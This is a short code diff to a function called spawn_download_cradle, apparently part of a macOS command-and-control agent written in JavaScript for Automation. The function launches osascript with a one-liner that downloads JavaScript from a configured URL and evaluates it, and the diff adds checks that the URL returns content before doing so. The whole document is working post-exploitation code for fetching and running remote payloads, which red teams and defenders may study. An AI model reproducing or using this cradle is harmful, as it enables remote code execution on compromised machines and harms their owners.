@@ -5,6 +5,15 @@ exports.spawn_download_cradle = function(task, command, params){
         let full_url = config['url'];
         let path = "/usr/bin/osascript";
         let args = ['-l','JavaScript','-e'];
+        let nsurl = $.NSURL.URLWithString(full_url);
+        let nsdata = $.NSData.dataWithContentsOfURL(nsurl);
+        if(nsdata.js === undefined){
+            return {"user_output":"Failed to fetch contents of URL", "completed": true, "status": "error"};
+        }
+        let nsstring = $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding);
+        if(nsstring.js === ""){
+            return {"user_output":"Got empty string from URL", "completed": true, "status": "error"};
+        }
         let command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
         command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));";
         args.push(command);
